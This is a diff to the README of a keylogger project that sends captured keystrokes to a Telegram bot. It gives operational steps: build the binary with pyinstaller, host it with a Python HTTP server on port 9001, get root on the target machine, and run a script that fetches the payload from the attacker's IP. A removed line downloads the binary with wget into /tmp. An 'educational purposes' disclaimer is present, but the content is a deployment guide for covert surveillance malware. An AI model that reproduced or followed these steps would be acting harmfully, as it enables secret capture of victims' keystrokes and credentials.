@@ -8,25 +8,33 @@ It require root access to the target.
 This project of a Key Logger is for **educational purposes**, it has been created only with my mere knowledge. Do **not** deploy or use this code on any system without explicit permission from the owner. Misuse of this software may violate laws and going to jail for stupid reasons it's dumb.
 
 ## How2UseIt
+Before starting you need to configure some stuff. Here's how:
 
-Once you gain access to the target machine, you have to options:
-1. Inject and execute (with root priviledges) the `make.sh` file.
-2. Create a root shell with `sudo su` paste and execute the content of `toBePasted.txt` .
+### Go on your machine:
+1. `git clone https://github.com/fortigate3600/KeyL.git`
+   `cd KeyL`
 
-But before you need to configure it for your own setup. Here's how:
-
-1. **Set Your Telegram Token (Mandatory)**  
+2. **Set Your Telegram Token**  
    Open `config.py` and insert your Telegram bot token.  
    > If you’re unsure how to get one, it's easy stuff just ask ChatGPT.
 
-2. **Customize Logger Behavior (Optional)**  
-   If you're geek enough you can configure the logger by modifying flags inside `KeyL.py`.  
-   If you make changes, you'll need to build your own version to install:
-   By default, `make.sh` installs the static version hosted on GitHub:
-   ```bash
-   wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
-   ```
+3. **Customize Logger Behavior (Optional)**  
+   If you're geek enough you can configure the logger by modifying flags inside `KeyL.py`.
 
+4. `ifconfig` to get yout ip, it is gonna be usefull later
+
+5. `pyinstaller --onefile --name mykeyl KeyL.py`
+
+6. `python3 -m http.server 9001`
+
+### Now on the target machine:
+
+Now you have to options:
+1. Inject and execute (with root priviledges) the `make.sh` file.
+
+2. Create a root shell with `sudo su` paste and execute the content of `toBePasted.txt` (easier).
+
+In both cases you have to modify the <IP> near the end with your IP, taken before with `ifconfig`
 
 ### Important:
 Before starting the program, send a dummy message to the Telegram bot.
